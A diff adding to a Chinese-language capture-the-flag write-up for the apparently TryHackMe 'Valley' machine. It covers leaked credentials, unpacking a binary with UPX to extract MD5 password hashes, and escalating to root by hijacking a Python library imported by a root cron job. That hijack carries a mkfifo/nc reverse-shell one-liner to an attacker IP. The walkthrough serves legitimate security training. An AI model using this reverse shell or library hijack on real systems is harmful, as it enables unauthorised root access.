@@ -47,6 +47,7 @@ Nmap done: 1 IP address (1 host up) scanned in 39.79 seconds\
 细看源码找到一个目录及用户名和密码
 f12找到了信息泄露
 ![](images/2024-03-04-19-25-15.png)
+siemDev/california
 
 ![](images/2024-03-04-19-26-57.png)
 既然看到这里了，肯定是要ftp了
@@ -110,4 +111,153 @@ Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-139-generic x86_64)
 
      https://ubuntu.com/pro
 valleyDev@valley:~$
+```
+## 逆向文件得到valley用户密码
+
+这里涉及到逆向了，只能看题解了
+```bash
+valleyDev@valley:/home$ ls -la
+total 752
+drwxr-xr-x  5 root      root        4096 Mar  6  2023 .
+drwxr-xr-x 21 root      root        4096 Mar  6  2023 ..
+drwxr-x---  4 siemDev   siemDev     4096 Mar 20  2023 siemDev
+drwxr-x--- 16 valley    valley      4096 Mar 20  2023 valley
+-rwxrwxr-x  1 valley    valley    749128 Aug 14  2022 valleyAuthenticator
+drwxr-xr-x  6 valleyDev valleyDev   4096 Mar  4 04:20 valleyDev
+
+valleyDev@valley:/home$ python3 -m http.server 9999
+```
+发现valleyAuthenticator文件
+传到kali来
+```bash
+sudo chmod +x valleyAuthenticator
+sudo upx valleyAuthenticator
+sudo upx -d valleyAuthenticator
+strings valleyAuthenticator
+strings valleyAuthenticator | grep -i pass -B 15 -A 15
+```
+upx valleyAuthenticator去壳
+sudo upx -d valleyAuthenticator解析
+strings valleyAuthenticator | grep -i pass -B 15 -A 15
+查看密码信息
+
+```bash
+┌──(kali㉿kali)-[~/workspace]
+└─$ strings valleyAuthenticator | grep -i pass -B 15 -A 15
+dL3$%0
+hI9m
+[]A\A]
+AUATI
+USHc
+[]A\A]A^
+t*f.
+[]A\
+I9\$xv.I
+T$pH
+tKU1
+e6722920bab2326f8217e4bf6b1b58ac
+dd2921cc76ee3abfd2beb60709056cfb
+Welcome to Valley Inc. Authenticator
+What is your username: 
+What is your password: 
+Authenticated
+Wrong Password or Username
+basic_string::_M_construct null not valid
+%02x
+basic_string::_M_construct null not valid
+terminate called recursively
+  what():  
+terminate called after throwing an instance of '
+terminate called without an active exception
+basic_string::append
+__gnu_cxx::__concurrence_lock_error
+__gnu_cxx::__concurrence_unlock_error
+locale::_S_normalize_category category not found
+locale::_Impl::_M_replace_facet
+NSt6locale5facetE
+N9__gnu_cxx24__concurrence_lock_errorE
+N9__gnu_cxx26__concurrence_unlock_errorE
+                                              
+```
+发现MD5
+e6722920bab2326f8217e4bf6b1b58ac
+dd2921cc76ee3abfd2beb60709056cfb
+![MD5 crack](images/2024-03-04-21-56-58.png)
+破解后使用valley用户登录
+
+## base64 库文件提权
+
+```bash
+valley@valley:~$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+1  *    * * *   root    python3 /photos/script/photosEncrypt.py
+```
+容易发现是有个计划任务的
+没分钟执行一次，很符合提权的条件
+```bash
+valley@valley:/photos/script$ cat photosEncrypt.py 
+#!/usr/bin/python3
+import base64
+for i in range(1,7):
+# specify the path to the image file you want to encode
+        image_path = "/photos/p" + str(i) + ".jpg"
+
+# open the image file and read its contents
+        with open(image_path, "rb") as image_file:
+          image_data = image_file.read()
+
+# encode the image data in Base64 format
+        encoded_image_data = base64.b64encode(image_data)
+
+# specify the path to the output file
+        output_path = "/photos/photoVault/p" + str(i) + ".enc"
+
+# write the Base64-encoded image data to the output file
+        with open(output_path, "wb") as output_file:
+          output_file.write(encoded_image_data)
+```
+但是问题是无法更改py文件的内容
+但是可以更改import base64 的库文件
+添加提权命令
+```bash
+import os
+os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.13.48.59 53 >/tmp/f')
+```
+![base64](images/2024-03-04-22-00-27.png)
+
+此时去等待反弹shell即可
+```bash
+┌──(kali㉿kali)-[~/LPE]
+└─$ sudo nc -lvnp 53                                  
+listening on [any] 53 ...
+connect to [10.13.48.59] from (UNKNOWN) [10.10.179.85] 41518
+sh: 0: can't access tty; job control turned off
+# whoami
+root
+# ls /root
+root.txt
+snap
+# cat /root/root.txt
+THM{v@lley_0f_th3_sh@d0w_0f_pr1v3sc}
+# 
 ```
